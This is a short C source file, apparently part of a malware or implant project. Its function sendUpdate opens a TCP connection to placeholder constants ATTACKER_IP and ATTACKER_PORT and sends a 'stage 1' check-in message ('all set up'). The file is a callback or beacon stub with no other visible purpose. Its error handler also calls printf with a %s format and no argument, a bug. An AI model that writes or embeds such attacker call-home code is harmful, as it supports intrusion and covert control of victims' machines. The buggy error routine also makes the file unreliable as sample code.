#include "headers.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>



int valid(int status, char *stage);

int sendUpdate(){
        printf("[*] stage 1\n");
        
        char buffer[1024] ={0};
        int status, connID;
        
        int RUN = 1;
        struct sockaddr_in dstAddr;
        
        connID = socket(AF_INET ,SOCK_STREAM, 0);
        if(valid(connID,"creation")==1){return 1;}
        
        dstAddr.sin_family = AF_INET;
        dstAddr.sin_port = htons(ATTACKER_PORT);
        
        status = inet_pton(AF_INET, ATTACKER_IP, &dstAddr.sin_addr);
        if(valid(status,"inet_pton")==1){return 1;}
        
        status = connect(connID, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
        if(valid(status,"connect")==1){return 1;}
        
        printf("connected\n");
        
        
        char *hello = "all set up";
        send(connID, hello, strlen(hello),0);
                
            
        
        close(connID);
        return 0;
}

int valid(int status, char *stage){
    if(status<0){
        printf("Failed at: %s");
        return 1;
    }
    else{return 0;}
}
